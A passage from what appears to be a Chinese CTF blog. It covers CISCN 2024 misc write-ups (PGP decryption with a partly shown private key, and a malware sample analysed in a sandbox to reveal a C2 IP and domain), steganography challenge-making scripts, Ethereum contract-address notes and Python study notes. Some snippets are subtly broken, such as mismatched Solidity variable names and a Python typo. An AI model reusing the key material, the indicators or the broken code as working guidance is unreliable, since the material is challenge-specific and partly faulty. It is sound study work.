HEZfp<br>vKN/A1X8AvCxxZu/m9rS8nZQ/BNt7qAG6DjBXrWycWn2swYtMIzys/CsKkhg33hO<br>iHcehkCXX0Jd8TmE664iLs1WUVHzXK/v5h4XA1o=<br>=Izki<br>-----END PGP PRIVATE KEY BLOCK-----<br></code></pre></td></tr></table></figure><p>可以看出是一个pgp加密的公钥，那另一个是密文了，将其转为16进制导出。</p><p>然后题目给的是私钥了：56 16 26 93 66 53 16 56 d2 03 26 93 56<br>将其反转并转ascii</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> string <span class="hljs-keyword">import</span> printable<br><br><span class="hljs-comment"># for item in printable:</span><br><span class="hljs-comment">#     print(ord(item), end=&#x27; &#x27;)</span><br><span class="hljs-comment"># 48 49 50 51 52 53 54 55 56 57 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 58 59 60 61 62 63 64 91 92 93 94 95 96 123 124 125 126 32 9 10 13 11 12</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve</span>():<br>    passwd = <span class="hljs-string">&#x27;&#x27;</span><br>    enc_passwds = [<span class="hljs-string">&#x27;56&#x27;</span>, <span class="hljs-string">&#x27;16&#x27;</span>, <span class="hljs-string">&#x27;26&#x27;</span>, <span class="hljs-string">&#x27;93&#x27;</span>, <span class="hljs-string">&#x27;66&#x27;</span>, <span class="hljs-string">&#x27;53&#x27;</span>,<br>                   <span class="hljs-string">&#x27;16&#x27;</span>, <span class="hljs-string">&#x27;56&#x27;</span>, <span class="hljs-string">&#x27;d2&#x27;</span>, <span class="hljs-string">&#x27;03&#x27;</span>, <span class="hljs-string">&#x27;26&#x27;</span>, <span class="hljs-string">&#x27;93&#x27;</span>, <span class="hljs-string">&#x27;56&#x27;</span>]<br>    <span class="hljs-comment"># for item in enc_passwds:</span><br>    <span class="hljs-comment">#     print(int(item, 16), end=&quot; &quot;)</span><br>    <span class="hljs-comment"># # 86 22 38 147 102 83 22 86 210 3 38 147 86</span><br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> enc_passwds:<br>        item = item[::-<span class="hljs-number">1</span>]<br>        <span class="hljs-comment"># print(int(item,16),end=&quot; &quot;)</span><br>        <span class="hljs-comment"># 101 97 98 57 102 53 97 101 45 48 98 57 101</span><br>        passwd += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(item, <span class="hljs-number">16</span>))<br>    <span class="hljs-keyword">return</span> passwd<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    passwd = solve()<br>    <span class="hljs-built_in">print</span>(passwd)<br><span class="hljs-comment"># eab9f5ae-0b9e</span><br></code></pre></td></tr></table></figure><p>然后进行解码即可得到flag</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs py">gpg --<span class="hljs-keyword">import</span> secret.gpg<br>gpg: /root/.gnupg/trustdb.gpg：建立了信任度数据库<br>gpg: 密钥 CD34F6C587E55290：公钥 “ctfer (none) &lt;ctfer@gmail.com&gt;” 已导入<br>gpg: 密钥 CD34F6C587E55290：私钥已导入<br>gpg: 处理的总数：<span class="hljs-number">1</span><br>gpg:               已导入：<span class="hljs-number">1</span><br>gpg:       读取的私钥：<span class="hljs-number">1</span><br>gpg:   导入的私钥：<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py"> gpg -d out.txt<br>gpg: 由 <span class="hljs-number">1024</span> 位的 RSA 密钥加密，标识为 51457644D5D8B1B5，生成于 <span class="hljs-number">2023</span>-05-<span class="hljs-number">29</span><br>      “ctfer (none) &lt;ctfer@gmail.com&gt;”<br>flag&#123;79830a47-faf7-<span class="hljs-number">4067</span>-b585-145776f833cd&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/05/27/ciscn-2024/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-28%20113925.png" alt="alt text"></p><h3 id="盗版软件"><a href="#盗版软件" class="headerlink" title="盗版软件"></a>盗版软件</h3><p>得到一个exe文件和一个dmp文件，运行exe文件后得到一张图片，发现其上方有点<br><img src="/2024/05/27/ciscn-2024/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-28%20133424.png" alt="alt text"><br>在全红是可以看出有zip，但是中间有垃圾数据，提取</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;output&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    data = f.read()<br><br>res = []<br>i = <span class="hljs-number">8</span><br><span class="hljs-keyword">while</span> i &lt; <span class="hljs-built_in">len</span>(data):<br>    res.append(data[i])<br>    i += <span class="hljs-number">2</span><br><span class="hljs-comment"># print(res)</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.zip&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(<span class="hljs-built_in">bytes</span>(res))<br></code></pre></td></tr></table></figure><p>得到一个.b文件，进行base85解码<br><img src="/2024/05/27/ciscn-2024/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-28%20132137.png" alt="alt text"><br>然后在云沙箱运行<br><a href="https://s.threatbook.com/report/file/a97946c34d2d8642820f196a54a6e8d78cf4f58a97e417be9696d7fd19e7fc95">https://s.threatbook.com/report/file/a97946c34d2d8642820f196a54a6e8d78cf4f58a97e417be9696d7fd19e7fc95</a></p><p><img src="/2024/05/27/ciscn-2024/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-28%20132047.png" alt="alt text"><br>得到 IP : 39.100.72.235<br>但是dmp用vol提取不出来东西，使用010，utf-8编码<br><img src="/2024/05/27/ciscn-2024/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-28%20134226.png" alt="alt text"><br>得到 winhack.com</p>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>出题记录</title>
      <link href="/2024/05/15/%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2024/05/15/%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h3 id="ez"><a href="#ez" class="headerlink" title="ez"></a>ez</h3><p>据曾经做过的一个题目，需要python像素旋转。</p><p>使用PIL库对图片每一行像素进行循环移位：备份每一行的像素值，计算一个随机的起始点，然后对这一行的像素进行循环移位，最后保存并显示处理后的图像。通过这种方式，图像的每一行都会有一个随机的循环移位效果。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><br><br>f = <span class="hljs-string">&quot;C:\\Users\\86157\\Desktop\\新建文件夹4\\新建文件夹 (2)\\1123.png&quot;</span><br>img = Image.<span class="hljs-built_in">open</span>(f)<br><br><br>pixels = img.load()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(img.size[<span class="hljs-number">0</span>]):<br>    back_row = []<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(img.size[<span class="hljs-number">1</span>]):<br>        back_row.append(pixels[i, j])<br><br>    start = randint(<span class="hljs-number">0</span>, img.size[<span class="hljs-number">1</span>])  <br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(img.size[<span class="hljs-number">1</span>]):<br>        pixels[i, (j + start) % img.size[<span class="hljs-number">1</span>]] = back_row[j]<br><br>img.show()<br>img.save(<span class="hljs-string">&quot;C:\\Users\\86157\\Desktop\\新建文件夹4\\新建文件夹 (2)\\f11.png&quot;</span>)<br></code></pre></td></tr></table></figure><p>由<img src="/../images/imageq.png" alt="imageq"></p><p>得到</p><p><img src="/../images/f1123.png" alt="f1123"></p><h4 id="wp："><a href="#wp：" class="headerlink" title="wp："></a>wp：</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image  <span class="hljs-comment"># 导入处理图片的库</span><br><br><span class="hljs-comment"># 定义一个函数，用于根据指定位置对像素行进行循环移位</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rotate_pixels</span>(<span class="hljs-params">pixels, pivot</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;根据pivot点旋转像素&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> pixels[pivot:] + pixels[:pivot]<br><br><span class="hljs-comment"># 图片路径</span><br>image_path = <span class="hljs-string">&#x27;f1123.png&#x27;</span><br><br><span class="hljs-comment"># 打开图片并转换为RGB模式，获取图片的宽度和高度</span><br>p = Image.<span class="hljs-built_in">open</span>(image_path).convert(<span class="hljs-string">&#x27;RGB&#x27;</span>)<br>width, height = p.size<br><br><span class="hljs-comment"># 读取图片的所有像素到一个二维列表中</span><br>pixels = [[p.getpixel((x, y)) <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height)] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width)]<br><br><span class="hljs-comment"># 初始化一个列表，用于存储每行颜色变化的像素索引</span><br>change_indices = []<br><br><span class="hljs-comment"># 遍历每行像素，寻找首个红色像素后颜色变化的位置</span><br><span class="hljs-keyword">for</span> pixel_line <span class="hljs-keyword">in</span> pixels:<br>    found_red = <span class="hljs-literal">False</span>  <span class="hljs-comment"># 标记是否找到过红色像素</span><br>    <span class="hljs-comment"># 从第二像素开始遍历，避免初始的索引越界</span><br>    <span class="hljs-keyword">for</span> idx, pixel <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(pixel_line[<span class="hljs-number">1</span>:], start=<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">if</span> found_red <span class="hljs-keyword">and</span> pixel != pixel_line[idx - <span class="hljs-number">1</span>]:  <span class="hljs-comment"># 找到红后颜色变化</span><br>            change_indices.append(idx)  <span class="hljs-comment"># 记录变化位置</span><br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">elif</span> pixel == (<span class="hljs-number">255</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>):  <span class="hljs-comment"># 找到红色像素</span><br>            found_red = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:  <span class="hljs-comment"># 如果一行内没发现变化，记录None</span><br>        change_indices.append(<span class="hljs-literal">None</span>)<br><br><span class="hljs-comment"># 根据找到的索引进行像素行的旋转处理</span><br>rotated_pixels = []<br><span class="hljs-keyword">for</span> idx, pivot <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(change_indices):<br>    <span class="hljs-keyword">if</span> pivot <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:  <span class="hljs-comment"># 如果找到了旋转点</span><br>        rotated_pixels.append(rotate_pixels(pixels[idx], pivot))<br>    <span class="hljs-keyword">else</span>:  <span class="hljs-comment"># 没有旋转点，保持原行</span><br>        rotated_pixels.append(pixels[idx])<br><br><span class="hljs-comment"># 创建新图片并放置处理后的像素</span><br>new_image = Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>, (width, height))<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>        new_image.putpixel((x, y), rotated_pixels[x][y])<br><br><span class="hljs-comment"># 保存处理后的新图片</span><br>new_image.save(<span class="hljs-string">&#x27;flag1123_processed.png&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="lsb隐写"><a href="#lsb隐写" class="headerlink" title="lsb隐写"></a>lsb隐写</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_secret</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(s, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        data = f.read()<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">format</span>(byte, <span class="hljs-string">&#x27;08b&#x27;</span>) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> data)<br>     <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode</span>(<span class="hljs-params">original_file, hide_string, hide_file</span>):<br>    im = Image.<span class="hljs-built_in">open</span>(original_file)<br>    w, h = im.size<br>    secret_data = get_secret(hide_string)<br>    index = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(w):<br>        <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(h):<br>            <span class="hljs-keyword">if</span> index &gt;= <span class="hljs-built_in">len</span>(secret_data):<br>                <span class="hljs-keyword">break</span>  <span class="hljs-comment"># 已经嵌入所有秘密数据</span><br>            pixel = <span class="hljs-built_in">list</span>(im.getpixel((x, y)))  <span class="hljs-comment"># 将元组转为列表以便修改</span><br>            <br>            <span class="hljs-comment"># 分别在R、G、B通道的最低位嵌入数据</span><br>            <span class="hljs-keyword">for</span> channel <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>                <span class="hljs-keyword">if</span> index &lt; <span class="hljs-built_in">len</span>(secret_data):  <span class="hljs-comment"># 确保索引不超出秘密数据长度</span><br>                    pixel[channel] = (pixel[channel] &amp; ~<span class="hljs-number">1</span>) | <span class="hljs-built_in">int</span>(secret_data[index])  <span class="hljs-comment"># 使用位运算修改最低位</span><br>                    index += <span class="hljs-number">1</span><br>            <br>            im.putpixel((x, y), <span class="hljs-built_in">tuple</span>(pixel))  <span class="hljs-comment"># 将修改后的像素放回图像</span><br><br>    im.save(hide_file)<br><br>original_file = <span class="hljs-string">&#x27;1.png&#x27;</span><br>hide_string = <span class="hljs-string">&#x27;flag.txt&#x27;</span><br>hide_file = <span class="hljs-string">&#x27;flag.png&#x27;</span><br>encode(original_file, hide_string, hide_file)<br></code></pre></td></tr></table></figure><h3 id="网站"><a href="#网站" class="headerlink" title="网站"></a>网站</h3><p><a href="https://incoherency.co.uk/image-steganography/">图像隐写术 (incoherency.co.uk)</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>address计算</title>
      <link href="/2024/04/23/address%E8%AE%A1%E7%AE%97/"/>
      <url>/2024/04/23/address%E8%AE%A1%E7%AE%97/</url>
      
        <content type="html"><![CDATA[<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>以太坊有两种类型的账户：普通账户和合约账户。合约是通过发送带有空字段的事务(空的 to)来创建的，并且包含一些被执行的数据（一个构造函数），并且希望返回一些放在区块链上的代码。 这些合同自然是与正常账户相同的地址空间的一部分; 由此确定合同的地址：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">address</span> = <span class="hljs-built_in">sha3</span>(<span class="hljs-built_in">rlp_encode</span>(creator_account, creator_account_nonce))<span class="hljs-selector-attr">[12:]</span><br></code></pre></td></tr></table></figure><p>合约地址是确定性的，由 keccack256(address,nonce) 计算。(其中 address 是合约的地址(或创建交易的以太坊地址)，而 nonce 是合约生产其它合约的一个数值(或者对于常规交易来说是交易的nonce))。</p><p>从本质上讲，合约的地址就是账户与交易 nonce 串联的 keccak256 哈希值。合约的 nonce 是以 1 开始的，账户的交易 nonce 是以 0 开始的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract KeylessHiddenEthCreator &#123;<br>    uint public currentcontractNonce = 1; // keep track of this contract&#x27;s nonce publicly (it&#x27;s also found in the contract&#x27;s state<br><br>    // determine future addresses which can hide ether.<br>    function futureAddresses(uint8 nonce) public view returns (address) &#123;<br>        if (nonce == 0) &#123;<br>            return address(keccak256(0xd6, 0x94, this, 0x80));<br>        &#125; else &#123;<br>            return address(keccak256(0xd6, 0x94, this, nonce));<br>        &#125;<br>        // need to implement rlp encoding properly for a full range of nonces<br>        // increment the contract nonce or retrieve ether from a hidden/key-less account provided the nonce is correct<br>    &#125;<br><br>    function retrieveHiddenEther(address beneficiary) public returns (address) &#123;<br>        currentContractNonce += 1;<br>        return new RecoverContract(beneficiary);<br>    &#125;<br><br>    function payable &#123;&#125; // Allow ether transfers (helps for playing in remix)<br>&#125;<br><br>contract RecoverContract &#123;<br>    constructor(address beneficiary) &#123;<br>        selfdestruct(beneficiary); <br></code></pre></td></tr></table></figure><h3 id="地址计算脚本"><a href="#地址计算脚本" class="headerlink" title="地址计算脚本"></a>地址计算脚本</h3><h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> rlp<br><span class="hljs-keyword">from</span> ethereum <span class="hljs-keyword">import</span> utils<br>address = <span class="hljs-number">0xD8d6E16b2a224bB1Cd7e600c0b37603e341b4d93</span><br>nonce = <span class="hljs-number">1</span><br>rlp_res = rlp.encode([address,nonce])<br><span class="hljs-built_in">print</span>(rlp_res)<br>sha3_res = utils.mk_contract_address(address,nonce)<br><span class="hljs-built_in">print</span>(sha3_res)<br>sha3_res_de = utils.decode_addr(sha3_res)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;contract_address: &quot;</span> + sha3_res_de)<br></code></pre></td></tr></table></figure><h4 id="solidity"><a href="#solidity" class="headerlink" title="solidity"></a>solidity</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>contract Hack &#123;<br>    function getdd(address target) public view returns (address) &#123;<br>        address data = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), target, bytes1(0x01))))));<br>        return data;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python 学习</title>
      <link href="/2024/04/15/Python-%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/04/15/Python-%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h3 id="os"><a href="#os" class="headerlink" title="os"></a>os</h3><p>os.getcwd()</p><p>查看当前路径。</p><p>os.listdir(path)</p><p>返回指定目录下包含的文件和目录名列表。</p><p>os.path.abspath(path)</p><p>返回路径 path 的绝对路径。</p><p>os.path.split(path)</p><p>将路径 path 拆分为目录和文件两部分，返回结果为元组类型。</p><p>os.path.join(path, *paths)</p><p>将一个或多个 path（文件或目录） 进行拼接。</p><p>os.path.getctime(path)</p><p>返回 path（文件或目录） 在系统中的创建时间。</p><p>os.path.getmtime(path)</p><p>返回 path（文件或目录）的最后修改时间。</p><p>os.makedirs()</p><p>创建多级目录。</p><h3 id="time"><a href="#time" class="headerlink" title="time"></a>time</h3><h4 id="struct-time"><a href="#struct-time" class="headerlink" title="struct_time"></a>struct_time</h4><p>代表一个时间对象，可以通过索引以及属性名来访问。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs py"><br>索引属性值<br><span class="hljs-number">0</span>tm_year（年）如：<span class="hljs-number">1945</span><br><span class="hljs-number">1</span>tm_mon（月）<span class="hljs-number">1</span> ~ <span class="hljs-number">12</span><br><span class="hljs-number">2</span>tm_mday（日）<span class="hljs-number">1</span> ~ <span class="hljs-number">31</span><br><span class="hljs-number">3</span>tm_hour（时）<span class="hljs-number">0</span> ~ <span class="hljs-number">23</span><br><span class="hljs-number">4</span>tm_min（分）<span class="hljs-number">0</span> ~ <span class="hljs-number">59</span><br><span class="hljs-number">5</span>tm_sec（秒）<span class="hljs-number">0</span> ~ <span class="hljs-number">61</span><br><span class="hljs-number">6</span>tm_wday（周）<span class="hljs-number">0</span> ~ <span class="hljs-number">6</span><br><span class="hljs-number">7</span>tm_yday（一年内第几天）<span class="hljs-number">1</span> ~ <span class="hljs-number">366</span><br><span class="hljs-number">8</span>tm_isdst（夏时令）-<span class="hljs-number">1</span>、<span class="hljs-number">0</span>、<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>localtime()表示当前时间，返回类型为 struct_time对象</p><h4 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs py"><br>函数（常量）说明<br>time()返回当前时间的时间戳<br>gmtime([secs])将时间戳转换为格林威治天文时间下的 struct_time，可选参数 secs 表示从 epoch 到现在的秒数，默认为当前时间<br>localtime([secs])与 gmtime() 相似，返回当地时间下的 struct_time<br>mktime(t)localtime() 的反函数<br>asctime([t])接收一个 struct_time 表示的时间，返回形式为：Mon Dec  <span class="hljs-number">2</span> 08:<span class="hljs-number">53</span>:<span class="hljs-number">47</span> <span class="hljs-number">2019</span> 的字符串<br>ctime([secs])ctime(secs) 相当于 asctime(localtime(secs))<br>strftime(<span class="hljs-built_in">format</span>[, t])格式化日期，接收一个 struct_time 表示的时间，并返回以可读字符串表示的当地时间<br>sleep(secs)暂停执行调用线程指定的秒数<br>altzone本地 DST 时区的偏移量，以 UTC 为单位的秒数<br>timezone本地（非 DST）时区的偏移量，UTC 以西的秒数（西欧大部分地区为负，美国为正，英国为零）<br>tzname两个字符串的元组：第一个是本地非 DST 时区的名称，第二个是本地 DST 时区的名称<br><br></code></pre></td></tr></table></figure><h3 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h3><p>线程是CPU分配资源的基本单位。当一程序开始运行，这个程序就变成了一个进程，而一个进程相当于一个或者多个线程。当没有多线程编程时，一个进程相当于一个主线程；当有多线程编程时，一个进程包含多个线程（含主线程）。使用线程可以实现程序大的开发。</p><h5 id="创建多线程"><a href="#创建多线程" class="headerlink" title="创建多线程"></a>创建多线程</h5><ol><li>threading.Thread()创建</li></ol><p>语法形式：</p><p>threading.Thread(group&#x3D;nore,target&#x3D;none,args&#x3D;(),kwargs&#x3D;{},*,daemon&#x3D;None)</p><p>~group：必须为None，于ThreadGroup类相关，一般不使用。</p><p>~target：线程调用的对象，就是目标函数。</p><p>~name：为线程起这个名字。默认是Tread-x，x是序号，由1开始，第一个创建的线程名字就是Tread-1。</p><p>~args：为目标函数传递关键字参数，字典。</p><p>~daemon：用来设置线程是否随主线程退出而退出。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>(<span class="hljs-params">x,y</span>):<br>   <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(x,y):<br>       <span class="hljs-built_in">print</span>(i)<br>t1 = threadingTthread(name=<span class="hljs-string">&#x27;t1&#x27;</span>,target= test,args= (<span class="hljs-number">1</span>,<span class="hljs-number">10</span>))<br>t2 = threading.Thread(name=<span class="hljs-string">&#x27;t2&#x27;</span>,target= test,args= (<span class="hljs-number">11</span>,<span class="hljs-number">20</span>))<br>t1.start()<br>t2.start()<br><br></code></pre></td></tr></table></figure><p>两个程序是并发运行，所以顺序可能不</p><ol start="2"><li><p>treading.Thread类的继承</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 